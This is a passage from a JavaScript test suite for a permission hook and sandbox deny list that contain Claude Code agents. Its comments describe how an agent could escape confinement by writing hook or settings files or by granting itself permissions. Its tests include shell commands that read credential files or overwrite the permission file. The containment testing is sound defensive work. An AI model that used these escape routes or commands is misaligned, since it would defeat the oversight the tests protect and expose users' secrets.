  // three workspace files it denied. Built from a real open so the folders
  // and temp roots are exactly what this machine writes.
  function workspaceWithEarlierBlock(prefix) {
    const ws = tmp(prefix);
    open(ws);
    const settings = read(ws);
    settings.sandbox.filesystem.denyWrite = settings.sandbox.filesystem.denyWrite.slice(0, 3);
    assert.ok(settings.sandbox.filesystem.denyWrite.every((p) => !credentials().includes(p)), 'fixture sanity: the three workspace files an earlier release denied');
    fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
    return ws;
  }

  test('a block an earlier release wrote gains the credential entries on the next open', () => {
    const ws = workspaceWithEarlierBlock('wb-cred-upgrade-');
    const before = read(ws).sandbox;
    open(ws);
    const after = read(ws).sandbox;
    for (const c of credentials()) assert.ok(after.filesystem.denyWrite.includes(c), `${c} is denied after the upgrade`);
    assert.deepStrictEqual(after.filesystem.denyWrite.slice(0, 3), before.filesystem.denyWrite, 'the workspace files keep their place');
    assert.deepStrictEqual(after.filesystem.allowWrite, before.filesystem.allowWrite, 'and nothing the block permitted moved');
    assert.strictEqual(after.enabled, before.enabled, 'nor did the switch');
  });

  test('a Code mode block an earlier release wrote upgrades too', () => {
    const ws = tmp('wb-cred-upgrade-off-');
    fs.mkdirSync(path.join(ws, '.rundock'), { recursive: true });
    fs.writeFileSync(path.join(ws, '.rundock', 'state.json'), JSON.stringify({ workspaceMode: 'code' }));
    open(ws);
    const settings = read(ws);
    assert.strictEqual(settings.sandbox.enabled, false, 'fixture sanity: the off shape');
    settings.sandbox.filesystem.denyWrite = settings.sandbox.filesystem.denyWrite.slice(0, 3);
    fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
    open(ws);
    for (const c of credentials()) assert.ok(read(ws).sandbox.filesystem.denyWrite.includes(c), `${c} is denied in the off shape too`);
  });

  test('a block a person wrote is left exactly as they wrote it', () => {
    // The nearest thing to ours a person could write: an earlier release's
    // block with one deny entry of their own. It must not be recognised, and
    // so must neither gain the credential entries nor lose theirs.
    const ws = workspaceWithEarlierBlock('wb-cred-theirs-');
    const settings = read(ws);
    settings.sandbox.filesystem.denyWrite.push(path.posix.join(ws, 'notes.md'));
    fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
    const theirs = JSON.stringify(read(ws).sandbox);
    open(ws);
    assert.strictEqual(JSON.stringify(read(ws).sandbox), theirs, 'a person\'s block is never rewritten, byte for byte');

    const other = tmp('wb-cred-theirs-plain-');
    fs.mkdirSync(path.join(other, '.claude'), { recursive: true });
    const plain = { enabled: true, filesystem: { allowWrite: [other] } };
    fs.writeFileSync(settingsPath(other), JSON.stringify({ sandbox: plain }));
    open(other);
    assert.deepStrictEqual(read(other).sandbox, plain, 'nor is a block that never resembled ours');
  });

  test('a block every earlier build wrote gains the files that decide what runs on the next open', () => {
    const runs = (ws) => [path.posix.join(ws, '.mcp.json'), path.posix.join(ws, '.rundock', 'permission-hook.sh')];
    for (const n of [19, 8, 3]) {
      const ws = tmp(`wb-runs-upgrade-${n}-`);
      open(ws);
      const settings = read(ws);
      const current = settings.sandbox.filesystem.denyWrite;
      settings.sandbox.filesystem.denyWrite = current.slice(0, n);
      fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
      open(ws);
      assert.deepStrictEqual(read(ws).sandbox.filesystem.denyWrite, current, `the ${n}-entry block is ours, and is brought up to the whole list`);
      for (const p of runs(ws)) assert.ok(current.includes(p), `${p} is denied after the upgrade`);
    }
  });

  test('a list trimmed where no build stopped, or with an entry changed, is left byte for byte', () => {
    for (const change of ['trim', 'edit']) {
      const ws = tmp(`wb-runs-theirs-${change}-`);
      open(ws);
      const settings = read(ws);
      const deny = settings.sandbox.filesystem.denyWrite;
      settings.sandbox.filesystem.denyWrite = change === 'trim'
        ? deny.slice(0, deny.length - 1)
        : [...deny.slice(0, 18), path.posix.join(ws, 'their-own.json')];
      fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
      const theirs = fs.readFileSync(settingsPath(ws), 'utf8');
      open(ws);
      assert.strictEqual(JSON.stringify(read(ws).sandbox), JSON.stringify(JSON.parse(theirs).sandbox), `a ${change === 'trim' ? 'trimmed' : 'changed'} list is a person's edit, and stays theirs`);
    }
  });

  test('opening twice after the upgrade changes nothing the second time', () => {
    const ws = workspaceWithEarlierBlock('wb-cred-twice-');
    open(ws);
    const once = fs.readFileSync(settingsPath(ws), 'utf8');
    open(ws);
    const twice = fs.readFileSync(settingsPath(ws), 'utf8');
    assert.strictEqual(twice, once, 'the second open finds the block current and leaves the file byte for byte');
    const deny = read(ws).sandbox.filesystem.denyWrite;
    assert.strictEqual(new Set(deny).size, deny.length, 'and no entry was appended twice');
  });
});

// THE FILES THE RUNTIME ACTS ON OUTSIDE THE SANDBOX. A sandboxed command that
// writes one of these runs code unconfined in a later session. Claude Code
// refuses those writes itself, but only from the release that added each
// refusal, and Rundock spawns whichever release is installed, so the block
// names every one of them as well.
describe('the block denies the runtime\'s own escape paths, whatever runtime version runs it', () => {
  const HOME = '/Users/someone';
  const WS = '/w/ws';
  const HOME_ESCAPES = homeEscapes(HOME);
  const credentials = (home) => hook.secretsRegistry(home).map((p) => p.split(path.sep).join('/'));

  test('every one is in denyWrite, in both shapes the block takes', () => {
    for (const mode of ['on', 'off']) {
      const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], [], mode).filesystem.denyWrite;
      for (const p of HOME_ESCAPES) assert.ok(deny.includes(p), `the ${mode} block denies ${p}`);
    }
  });

  test('they follow the credential files, so the block every earlier release wrote is a prefix and upgrades', () => {
    const block = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []);
    const deny = block.filesystem.denyWrite;
    const lastCredential = deny.indexOf(credentials(HOME).slice(-1)[0]);
    assert.deepStrictEqual(deny.slice(lastCredential + 1, lastCredential + 1 + HOME_ESCAPES.length), HOME_ESCAPES,
      'appended after every entry an earlier release wrote, in this order');
    const asTheLastReleaseWroteIt = { ...block, filesystem: { ...block.filesystem, denyWrite: deny.slice(0, lastCredential + 1) } };
    assert.strictEqual(scaffold.isRundockSandbox(asTheLastReleaseWroteIt, 'darwin'), true,
      'a block without them is still recognised as Rundock\'s own, so the next open can add them');
  });

  test('the runtime\'s bookkeeping stays writable, and no read is denied', () => {
    for (const mode of ['on', 'off']) {
      const fsBlock = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], [], mode).filesystem;
      assert.ok(fsBlock.allowWrite.includes(`${HOME}/.claude`), 'the write list still names the runtime home whole');
      assert.ok(!fsBlock.allowWrite.some((p) => HOME_ESCAPES.includes(p)), 'and names none of the denied paths itself');
      assert.ok(!('denyRead' in fsBlock), `the ${mode} block denies writes only`);
    }
  });

  test('the home folder\'s escape paths are not joined onto the workspace, whose agents and skills Rundock writes', () => {
    // The home folder's agents/ and skills/ are denied; the workspace's are the
    // copies Rundock reads and writes through its own server.
    const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []).filesystem.denyWrite;
    for (const name of ['agents', 'skills', 'plugins', 'hooks', 'commands', 'backups']) {
      assert.ok(!deny.some((p) => p === `${WS}/.claude/${name}` || p.startsWith(`${WS}/.claude/${name}/`)),
        `${WS}/.claude/${name} is not denied`);
    }
  });

  test('the workspace\'s project settings file is denied too, after the home folder\'s escape paths', () => {
    // The runtime loads `.claude/settings.json` from the workspace for every
    // agent Rundock spawns there, and starts the hooks it names itself.
    for (const mode of ['on', 'off']) {
      const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], [], mode).filesystem.denyWrite;
      assert.ok(deny.includes(`${WS}/.claude/settings.json`), `the ${mode} block denies the project settings file`);
    }
    const block = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []);
    const deny = block.filesystem.denyWrite;
    const at = deny.indexOf(`${WS}/.claude/settings.json`);
    assert.deepStrictEqual(deny.slice(at - HOME_ESCAPES.length, at), HOME_ESCAPES, 'straight after the home folder\'s escape paths');
    const withoutIt = { ...block, filesystem: { ...block.filesystem, denyWrite: deny.filter((p) => p !== `${WS}/.claude/settings.json`) } };
    assert.strictEqual(scaffold.isRundockSandbox(withoutIt, 'darwin'), false,
      'no release wrote the list without it, so a block missing only it is a person\'s edit, and stays theirs');
  });

  // The launcher the runtime starts the permission hook through decides what
  // every check answers, and `.mcp.json` names servers the runtime starts as
  // their own processes. The hook asks about a write to either; this is the
  // half that refuses a sandboxed write however it was made.
  test('the workspace\'s connector file and the permission hook\'s launcher are denied last of all', () => {
    for (const mode of ['on', 'off']) {
      const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], [], mode).filesystem.denyWrite;
      assert.deepStrictEqual(deny.slice(-3), [`${WS}/.claude/settings.json`, `${WS}/.mcp.json`, `${WS}/.rundock/permission-hook.sh`],
        `the ${mode} block appends them after the project settings, never inserting them`);
    }
  });

  test('each is a file the hook asks about, so the two enforcement points name the same files', () => {
    const ws = tmp('wb-runs-bound-');
    for (const f of scaffold.WORKSPACE_RUNS_FILES) {
      assert.ok(hook.isWorkspaceAnswerFile(path.join(ws, ...f.split('/')), ws), `${f} is an answer file to the hook`);
      const access = hook.classifyFileAccess('Write', { file_path: path.join(ws, ...f.split('/')) }, ws, [], os.homedir());
      assert.strictEqual(access.answerFile, true, `and a write to ${f} asks`);
    }
    assert.ok(hook.LAUNCHER_FILES.filter((f) => f.endsWith('.sh')).every((f) => scaffold.WORKSPACE_RUNS_FILES.includes(f)),
      'every launcher a macOS block can meet is denied');
    assert.ok(hook.WHAT_RUNS_FILES.every((f) => scaffold.WORKSPACE_RUNS_FILES.includes(f) || f === '.claude/settings.json'),
      'and every file the hook says decides what runs, the project settings being denied with the escape paths');
  });

  test('the operating-system paragraph names every escape path the block denies', () => {
    // Read from the block rather than from a list kept here, so an entry added
    // to the code without a word in the document fails.
    const doc = fs.readFileSync(path.join(ROOT, 'ARCHITECTURE.md'), 'utf8');
    const start = doc.indexOf('**The guarantee is the operating-system row, and only that row.**');
    assert.ok(start !== -1, 'the paragraph is present');
    const paragraph = doc.slice(start, doc.indexOf('\n', start));
    const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []).filesystem.denyWrite;
    const escapes = deny.slice(deny.indexOf(credentials(HOME).slice(-1)[0]) + 1);
    assert.ok(escapes.length > 0, 'sanity: there are escape paths to name');
    for (const p of escapes) {
      const name = p.startsWith(`${HOME}/.claude/settings.json`) ? '~/.claude/settings.json'
        : p.startsWith(`${HOME}/.claude/`) ? p.slice(`${HOME}/.claude/`.length)
          : p.startsWith(`${HOME}/.claude-`) ? `~/${p.slice(`${HOME}/`.length)}`
            : p.startsWith(`${WS}/`) ? p.slice(`${WS}/`.length) : p;
      assert.ok(paragraph.includes(`\`${name}\``), `the paragraph names \`${name}\`, which the block denies`);
    }
    assert.match(paragraph, /acts on outside the sandbox in a later session, including/,
      'the list is offered as examples of what the runtime acts on, not as all of it');
    assert.match(paragraph,
      /The Claude Code 2\.1\.259 bundle carries that last group of `denyWrite` entries in its own built-in write-deny list \(a static read of the bundle, not a live measurement\)/,
      'and says where the runtime\'s own list was read, and how');
    assert.match(paragraph, /When the workspace is the home folder/, 'and what the deny means when the workspace is the home folder');
    assert.match(paragraph, /A workspace opened inside one of those folders/, 'and for a workspace opened inside one of them');
    assert.match(paragraph, /A deny list trimmed to exactly the length an earlier build wrote reads as that build's block and is upgraded/,
      'and it does not claim a person\'s edit is never touched without saying where that stops');
  });

  test('the persistence passage says the block refuses a shell write only where the block denies it', () => {
    // Bound in both directions over the registry's own surfaces: each one the
    // block denies is named where the passage says the write is refused, and
    // each one it does not deny is named where the passage says the write lands.
    const doc = fs.readFileSync(path.join(ROOT, 'ARCHITECTURE.md'), 'utf8');
    const passage = doc.slice(doc.indexOf('<!-- boundary-registry-start -->'), doc.indexOf('<!-- boundary-registry-end -->'));
    const approved = passage.indexOf('Approving it lets the command run.');
    assert.ok(approved !== -1, 'the passage says what approving a shell write does');
    const refusedAt = passage.indexOf('the block\'s `denyWrite` list names', approved);
    assert.ok(refusedAt !== -1, 'the passage says what the block denies');
    const refused = passage.slice(refusedAt, passage.indexOf('so the sandboxed write is refused', refusedAt));
    const landsAt = passage.indexOf('is not in the block\'s deny list and lands once approved');
    assert.ok(landsAt !== -1, 'the passage says what the block leaves writable');
    assert.match(passage.slice(landsAt, passage.indexOf('. ', landsAt)),
      /as the 2\.1\.259 bundle's does \(a static read of the bundle, not a live measurement\)/,
      'and says how the runtime\'s own list was read');
    const lands = passage.slice(passage.lastIndexOf('. ', landsAt), landsAt);
    const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []).filesystem.denyWrite;
    const surfaces = [...hook.PERSISTENCE_SURFACE_DIRS.map((d) => [d, `\`${d}/\``]), ...hook.PERSISTENCE_SURFACE_FILES.map((f) => [f, `\`${f}\``])];
    for (const [name, quoted] of surfaces) {
      if (deny.includes(`${HOME}/.claude/${name}`)) {
        assert.ok(refused.includes(quoted) && !lands.includes(quoted), `${quoted} is denied by the block, and the passage says its write is refused`);
      } else {
        assert.ok(lands.includes(quoted) && !refused.includes(quoted), `${quoted} is not denied by the block, and the passage says its write lands`);
      }
    }
  });
});

// AN EXISTING WORKSPACE GAINS THE ESCAPE PATHS THE WAY IT GAINED THE CREDENTIAL
// FILES: on its next open, and on every write of the switch, in both shapes.
describe('an existing workspace gains the escape-path denies on open, and keeps them across the switch', () => {
  const home = os.homedir();
  const escapes = (ws) => [...homeEscapes(home), path.posix.join(ws, '.claude', 'settings.json')];
  function open(ws) {
    const prev = scaffold.wireScaffoldDeps({ invalidateAgentCache: () => {}, rebaselineAgentsWatcher: () => {} });
    try { scaffold.scaffoldWorkspace(ws, { platform: 'darwin' }); } finally { scaffold.wireScaffoldDeps(prev); }
  }
  const settingsPath = (ws) => path.join(ws, '.claude', 'settings.local.json');
  const read = (ws) => JSON.parse(fs.readFileSync(settingsPath(ws), 'utf8'));
  // A workspace carrying the block an earlier build wrote, from the frozen
  // record of that build's output, with the mode that build wrote it under.
  function workspaceWithReleasedBlock(prefix, n, shape) {
    const ws = tmp(prefix);
    fs.mkdirSync(path.join(ws, '.rundock'), { recursive: true });
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(ws, '.rundock', 'state.json'), JSON.stringify({ workspaceMode: shape === 'on' ? 'knowledge' : 'code' }));
    fs.writeFileSync(settingsPath(ws), JSON.stringify({ sandbox: releasedBlock(n, ws, home, scaffold.tempRoots(), shape) }, null, 2));
    return ws;
  }
  // Each length an earlier build wrote, in each shape it wrote it in.
  const WRITTEN = [[0, 'on'], [1, 'on'], [1, 'keyless'], [2, 'on'], [2, 'keyless'], [3, 'on'], [3, 'off'], [8, 'on'], [8, 'off']];
  assert.deepStrictEqual([...new Set(WRITTEN.map(([n]) => n))], RELEASED_DENY_LENGTHS, 'fixture sanity: every written length is driven');

  for (const [n, shape] of WRITTEN) {
    test(`opening upgrades the ${shape} block with the ${n} deny entries an earlier build wrote`, () => {
      const ws = workspaceWithReleasedBlock(`wb-escape-open-${n}-${shape}-`, n, shape);
      const before = read(ws).sandbox;
      open(ws);
      const after = read(ws).sandbox;
      for (const p of escapes(ws)) assert.ok(after.filesystem.denyWrite.includes(p), `${p} is denied after the open`);
      assert.deepStrictEqual(after.filesystem.denyWrite.slice(0, n), releasedDenyWrite(ws, home).slice(0, n),
        'the entries that build wrote keep their place');
      assert.deepStrictEqual(after.filesystem.allowWrite, before.filesystem.allowWrite, 'nothing the block permitted moved');
      assert.strictEqual(after.enabled, shape === 'on', 'and the switch is what that build\'s mode implied');
    });
  }

  test('switching the block off and on again keeps them, and so does a block the switch upgrades', () => {
    const ws = workspaceWithReleasedBlock('wb-escape-switch-', 8, 'on');
    scaffold.reconcileSandboxForMode(ws, 'off', 'darwin');
    assert.strictEqual(read(ws).sandbox.enabled, false, 'sanity: the switch wrote the off shape');
    for (const p of escapes(ws)) assert.ok(read(ws).sandbox.filesystem.denyWrite.includes(p), `${p} is denied in the off shape`);
    scaffold.reconcileSandboxForMode(ws, 'on', 'darwin');
    assert.strictEqual(read(ws).sandbox.enabled, true, 'sanity: and back on');
    for (const p of escapes(ws)) assert.ok(read(ws).sandbox.filesystem.denyWrite.includes(p), `${p} is denied in the on shape`);
  });

  test('a block a person wrote does not gain them', () => {
    const ws = workspaceWithReleasedBlock('wb-escape-theirs-', 8, 'on');
    const settings = read(ws);
    settings.sandbox.filesystem.denyWrite.push(path.posix.join(ws, 'notes.md'));
    fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
    const theirs = JSON.stringify(read(ws).sandbox);
    open(ws);
    scaffold.reconcileSandboxForMode(ws, 'off', 'darwin');
    assert.strictEqual(JSON.stringify(read(ws).sandbox), theirs, 'neither the open nor the switch rewrites it');
  });

  for (const removed of [1, 3, 10]) {
    test(`a person who removes the last ${removed} deny ${removed === 1 ? 'entry' : 'entries'} keeps the block they wrote`, () => {
      const ws = tmp(`wb-escape-removed-${removed}-`);
      open(ws);
      const settings = read(ws);
      settings.sandbox.filesystem.denyWrite = settings.sandbox.filesystem.denyWrite.slice(0, -removed);
      fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
      const theirs = JSON.stringify(read(ws).sandbox);
      open(ws);
      assert.strictEqual(JSON.stringify(read(ws).sandbox), theirs, 'the next open leaves it byte for byte');
      scaffold.reconcileSandboxForMode(ws, 'off', 'darwin');
      assert.strictEqual(JSON.stringify(read(ws).sandbox), theirs, 'and so does the switch');
    });
  }

  test('removing all thirteen leaves the 0.15.6 list, which upgrades like that release\'s own block', () => {
    // The two cannot be told apart on disk: a person who removes exactly the
    // entries added after 0.15.6 has written that release's block.
    const ws = tmp('wb-escape-removed-all-');
    open(ws);
    const settings = read(ws);
    settings.sandbox.filesystem.denyWrite = settings.sandbox.filesystem.denyWrite.slice(0, -13);
    assert.deepStrictEqual(settings.sandbox.filesystem.denyWrite, releasedDenyWrite(ws, home), 'sanity: exactly the 0.15.6 list');
    fs.writeFileSync(settingsPath(ws), JSON.stringify(settings, null, 2));
    open(ws);
    for (const p of escapes(ws)) assert.ok(read(ws).sandbox.filesystem.denyWrite.includes(p), `${p} is back after the open`);
  });
});

// ── Named working folders ──────────────────────────────────────────────
// A workspace can name folders its agents also work in. The mechanism is the
// same containment comparison the workspace root already uses, so the tests
// that matter are not the ones proving a named folder works. They are the ones
// proving it does NOT reach where it must never reach.
//
// The comparison runs before the runtime-home tier tags at every site that
// consults it, so a named ancestor of `~/.claude` would otherwise classify
// `.credentials.json` as inside and allow it outright: no card, no grading,
// the secrets tier never consulted. Every assertion below drives a real named
// folder rather than asserting on the helper, because the helper being correct
// in isolation is exactly what the escape looked like.
describe('a named working folder covers what is beneath it, and stops at the runtime home', () => {
  test('a named parent covers a project beneath it, including one created later', () => {
    const ws = tmp('nf-ws-');
    const projects = tmp('nf-projects-');
    fs.mkdirSync(path.join(projects, 'alchemist', 'src'), { recursive: true });

    const inNamed = hook.classifyFileAccess('Read', { file_path: path.join(projects, 'alchemist', 'src', 'a.js') }, ws, [projects]);
    assert.strictEqual(inNamed.where, 'inside', 'a file beneath the named parent raises no card');

    // The point of naming a PARENT: a folder that does not exist yet is
    // covered by the same act, with nothing further to approve.
    const unborn = path.join(projects, 'a-project-started-next-month', 'index.js');
    assert.strictEqual(hook.classifyFileAccess('Write', { file_path: unborn }, ws, [projects]).where, 'inside',
      'a folder created later is covered without naming it');

    // And the reported case end to end: a build is almost all shell, and a
    // shell crossing offers no standing grant, so this is the one that decides
    // whether the storm actually stops.
    assert.strictEqual(
      hook.classifyShellAccess('Bash', { command: `npm run build --prefix ${path.join(projects, 'alchemist')}` }, ws, [projects]),
      null, 'a shell command reaching a project beneath the named parent reports no crossing at all');

    // A sibling that was NOT named is untouched by any of this.
    const elsewhere = tmp('nf-elsewhere-');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(elsewhere, 'x.md') }, ws, [projects]).where, 'outside',
      'naming one folder says nothing about any other');

    // AND THE LOOKALIKE, which is how this comparison goes wrong when it goes
    // wrong: a bare string prefix puts `Projects-old` inside `Projects`,
    // because the separator stops being part of the comparison. Built as a
    // deliberate pair rather than two random temporary names, or the case is
    // never actually exercised.
    const base = tmp('nf-pair-');
    const named = path.join(base, 'Projects');
    const lookalike = path.join(base, 'Projects-old');
    fs.mkdirSync(named, { recursive: true });
    fs.mkdirSync(lookalike, { recursive: true });
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(named, 'a.md') }, ws, [named]).where,
      'inside', 'the named folder itself is covered');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(lookalike, 'a.md') }, ws, [named]).where,
      'outside', 'Projects-old is not inside Projects, whatever their names share');
  });

  test('naming the home folder does not silence the secrets tier, by file tool or by shell', () => {
    const home = tmp('nf-secret-home-');
    fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
    const ws = tmp('nf-secret-ws-');
    const credentials = path.join(home, '.claude', '.credentials.json');
    fs.writeFileSync(credentials, '{}');

    // `home` is named as a working folder, and it CONTAINS the runtime home.
    const read = hook.classifyFileAccess('Read', { file_path: credentials }, ws, [home], home);
    assert.strictEqual(read.where, 'outside', 'the secrets tier still cards, whatever is named');
    assert.strictEqual(read.secret, true);
    assert.strictEqual(read.grantDir, null, 'and still offers no standing grant');

    const shell = hook.classifyShellAccess('Bash', { command: `cat ${credentials}` }, ws, [home], home);
    assert.ok(shell && shell.crossings.length === 1, 'the shell half reports the crossing too');
    assert.strictEqual(shell.crossings[0].secret, true);
  });

  test('naming the home folder does not silence a persistence-surface write', () => {
    const home = tmp('nf-surface-home-');
    fs.mkdirSync(path.join(home, '.claude', 'agents'), { recursive: true });
    const ws = tmp('nf-surface-ws-');

    const write = hook.classifyFileAccess('Write', { file_path: path.join(home, '.claude', 'agents', 'new.md') }, ws, [home], home);
    assert.strictEqual(write.where, 'outside', 'a write to a persistence surface still cards');
    assert.strictEqual(write.persistenceSurface, true);

    const shell = hook.classifyShellAccess('Bash', { command: `touch ${path.join(home, '.claude', 'agents', 'x.md')}` }, ws, [home], home);
    assert.strictEqual(shell.crossings[0].persistenceSurface, true);

    // The freeing half of the tier is equally intact: naming a folder must not
    // change what was already free, or the setting would be silently altering
    // decisions nobody asked it to alter.
    fs.mkdirSync(path.join(home, '.claude', 'cache'), { recursive: true });
    assert.strictEqual(
      hook.classifyFileAccess('Write', { file_path: path.join(home, '.claude', 'cache', 'page.html') }, ws, [home], home).where,
      'inside', 'free scratch under the runtime home stays free');
  });

  test('a runtime home reached through a symlink is still the runtime home, whatever is named', () => {
    // BOTH SIDES OF THE STOP ARE CANONICALISED, and this is what proves it. A
    // home whose .claude is a link elsewhere resolves to a real directory that
    // a named ancestor could otherwise contain: name that ancestor and, if the
    // stop compared the unresolved spelling, the secrets tier would be reached
    // through the back door while the front door stayed shut.
    const home = tmp('nf-linkhome-');
    const realStore = tmp('nf-linkhome-real-');
    const claudeReal = path.join(realStore, 'claude-data');
    fs.mkdirSync(claudeReal, { recursive: true });
    try { fs.symlinkSync(claudeReal, path.join(home, '.claude'), 'dir'); } catch (e) { return; }
    assert.notStrictEqual(fs.realpathSync(path.join(home, '.claude')), path.join(home, '.claude'),
      'the link and its target must differ, or this passes vacuously');
    const credentials = path.join(home, '.claude', '.credentials.json');
    fs.writeFileSync(credentials, '{}');
    const ws = tmp('nf-linkhome-ws-');

    // realStore is named, and it CONTAINS the runtime home's real directory.
    const read = hook.classifyFileAccess('Read', { file_path: credentials }, ws, [realStore], home);
    assert.strictEqual(read.where, 'outside', 'the secrets tier is reached through the link and still cards');
    assert.strictEqual(read.secret, true);
    const shell = hook.classifyShellAccess('Bash', { command: `cat ${credentials}` }, ws, [realStore], home);
    assert.ok(shell && shell.crossings.length === 1 && shell.crossings[0].secret === true,
      'and the shell half agrees, rather than the two disagreeing about one path');
  });

  test('a named folder is canonicalised, so a folder reached through a symlink still covers its files', () => {
    // Dropbox and iCloud folders are routinely symlinked, and the storm this
    // setting ends is partly a symlink story already. A named folder compared
    // unresolved would cover nothing while looking configured.
    const real = tmp('nf-link-real-');
    fs.mkdirSync(path.join(real, 'proj'), { recursive: true });
    const linkParent = tmp('nf-link-parent-');
    const link = path.join(linkParent, 'named');
    try { fs.symlinkSync(real, link, 'dir'); } catch (e) { return; }
    // Precondition: the two spellings must actually differ, or this passes
    // vacuously on a host where they coincide.
    assert.notStrictEqual(fs.realpathSync(link), link, 'the link and its target must be different paths for this to prove anything');

    const ws = tmp('nf-link-ws-');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(real, 'proj', 'a.md') }, ws, [link]).where, 'inside',
      'named through the link, reached through the real path');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(link, 'proj', 'a.md') }, ws, [real]).where, 'inside',
      'named through the real path, reached through the link');
  });

  test('naming nothing changes nothing, which is what every other test in this file assumes', () => {
    const home = tmp('nf-empty-home-');
    fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
    const ws = tmp('nf-empty-ws-');
    const outside = tmp('nf-empty-outside-');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(outside, 'x.md') }, ws, [], home).where, 'outside');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: path.join(ws, 'x.md') }, ws, [], home).where, 'inside');
  });
});

// ---------------------------------------------------------------------------
// AN AGENT MAY ASK FOR A PERMISSION. IT MUST NEVER GRANT ONE.
//
// The workspace's own `.claude/settings.local.json` holds its standing
// permission grants, and the runtime loads the permission hooks themselves
// from it. It sits inside the workspace, so a write to it classified as
// ordinary inside-workspace work: no card, no friction, no record. An agent
// could edit the file that decides what an agent needs permission for,
// including the hook configuration that produces the cards at all.
//
// A standing grant is the wrong answer for this file in particular: one click
// would hand an agent lasting authority over the thing that decides what needs
// authority. So it cards, and the card carries no folder to grant.
// ---------------------------------------------------------------------------
describe('the workspace permission file is not an agent\'s to write', () => {
  const home = os.homedir();
  const settingsIn = (ws) => path.join(ws, '.claude', 'settings.local.json');

  test('a write to it cards instead of passing as ordinary inside work', () => {
    const ws = tmp('wb-selfgrant-');
    const access = hook.classifyFileAccess('Write', { file_path: settingsIn(ws) }, ws, [], home);
    // Was `where === 'outside'`, which forced the card but described a
    // crossing that never happened, so the card announced the workspace had
    // been left above a path plainly inside it. `where` now says where the
    // file is; `answerFile` says why it still asks.
    assert.strictEqual(access.answerFile, true,
      'the file that governs permissions is not ordinary inside-workspace work');
    assert.strictEqual(access.where, 'inside', 'and it is, in fact, inside the workspace');
  });

  test('and the card carries nothing that could answer it a second time', () => {
    // grantDir is what a standing grant is recorded from. Null means the
    // question can be answered for this write and never pre-answered.
    const ws = tmp('wb-selfgrant-grant-');
    const access = hook.classifyFileAccess('Write', { file_path: settingsIn(ws) }, ws, [], home);
    assert.strictEqual(access.grantDir, null,
      'no folder travels with it, so no Always Allow can be built from it');
  });

  test('editing it is a write too, and reading it is not', () => {
    const ws = tmp('wb-selfgrant-edit-');
    assert.strictEqual(hook.classifyFileAccess('Edit', { file_path: settingsIn(ws) }, ws, [], home).answerFile, true,
      'a tool that changes the file is a write whatever it is called');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: settingsIn(ws) }, ws, [], home).where, 'inside',
      'reading it tells an agent what it may already do, which is not the act being stopped');
  });

  test('a shell command reaching it crosses too, not only a file tool', () => {
    // The command grader and the path grader are separate. A rule only one of
    // them knows is not a rule: an agent with a shell would walk around it.
    const ws = tmp('wb-selfgrant-shell-');
    const access = hook.classifyShellAccess('Bash', { command: `echo '{}' > ${settingsIn(ws)}` }, ws, [], home, false);
    assert.ok(access && access.where === 'outside',
      'redirecting into the file is the same act as writing it');
  });

  test('the operating system is told as well, where it can be told', () => {
    // One registry, two enforcement points: the hook cards on every platform,
    // the sandbox denies outright where a sandbox runs. A file protected by
    // one and not the other is protected on some machines and not others.
    const ws = tmp('wb-selfgrant-sandbox-');
    const block = scaffold.sandboxSettings(ws, 'darwin', home, ['/tmp/t'], [], 'knowledge');
    assert.ok(block.filesystem.denyWrite.some(p => p.endsWith('.claude/settings.local.json')),
      'the sandbox denies the write outright, rather than leaving the card as the only line');
  });

  test('the files this rule already covered still behave exactly as they did', () => {
    const ws = tmp('wb-selfgrant-regress-');
    assert.strictEqual(hook.classifyFileAccess('Write', { file_path: path.join(ws, '.rundock', 'state.json') }, ws, [], home).answerFile, true,
      'the answer files keep their protection');
    assert.strictEqual(hook.classifyFileAccess('Write', { file_path: path.join(ws, 'notes', 'a.md') }, ws, [], home).where, 'inside',
      'and ordinary work in the workspace is still ordinary work');
  });
});

describe('a workspace written before the permission file was protected', () => {
  const home = os.homedir();

  test('is still recognised as ours, so it gets the new protection rather than being left alone', () => {
    // The recogniser rebuilds the CURRENT block and accepts the shorter deny
    // lists earlier builds wrote, each a prefix of today's. That makes the
    // order of the registry load-bearing: a new entry appended last leaves the
    // old list as a prefix and every existing workspace is recognised and
    // rewritten, while the same entry inserted first would strand all of them
    // as user-authored and they would never be protected at all.
    const ws = tmp('wb-selfgrant-upgrade-');
    const current = scaffold.sandboxSettings(ws, 'darwin', home, ['/tmp/t'], [], 'knowledge');
    assert.deepStrictEqual(current.filesystem.denyWrite.slice(0, 2), releasedDenyWrite(ws, home).slice(0, 2),
      'the list written before the permission file is still the head of today\'s');
    assert.ok(current.filesystem.denyWrite.includes(path.posix.join(ws, '.claude', 'settings.local.json')), 'and today\'s carries it');
    const asItWasWritten = releasedBlock(2, ws, home, ['/tmp/t'], 'on');
    assert.strictEqual(scaffold.isRundockSandbox(asItWasWritten, 'darwin'), true,
